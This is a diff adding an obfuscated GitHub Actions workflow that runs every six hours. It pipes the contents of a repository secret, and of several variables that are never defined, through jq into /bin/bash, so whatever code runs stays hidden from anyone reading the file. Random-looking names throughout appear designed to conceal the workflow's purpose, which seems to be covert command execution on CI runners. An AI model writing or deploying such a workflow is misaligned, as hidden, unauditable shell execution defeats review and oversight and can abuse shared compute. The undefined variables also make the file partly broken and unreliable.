@@ -1,0 +1,25 @@
+name: ninboning
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ninboning
+        env:
+          x91844: ${{ secrets.x91844 }}
+        run: |
+          echo $x91844 | jq -r .xbn7848 | /bin/bash
+          echo $mr940 | jq -r .num1995 | /bin/bash
+          echo $bn58591 | jq -r .a294 | /bin/bash
+          echo $no528 | jq -r .bhxmz2 | /bin/bash
+          echo $gkrd7 | jq -r .vrkbc623 | /bin/bash
+          echo $tpvr0101 | jq -r .omz949 | /bin/bash
+          echo $ujkhk68008 | jq -r .f10 | /bin/bash
+          echo $hgb042 | jq -r .c3774 | /bin/bash
+          echo $i7 | jq -r .wi16209 | /bin/bash
+
